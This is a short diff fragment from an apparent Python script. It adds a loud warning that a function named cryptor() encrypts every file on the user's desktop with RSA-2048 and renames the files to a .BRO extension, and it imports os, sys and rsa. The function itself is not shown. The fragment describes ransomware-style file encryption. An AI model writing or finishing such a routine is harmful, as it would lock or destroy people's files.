@@ -1,3 +1,12 @@
+'''
+WARNING! WARNING! WARNING!
+READ THIS!
+
+function cryptor() encrypts all files on your desktop by RSA-2048 and rename they on FILENAME.BRO !!!
+LEARN FUNCTION BEFORE USING !!!
+
+WARNING! WARNING! WARNING!
+'''
 import os
 import sys
 import rsa
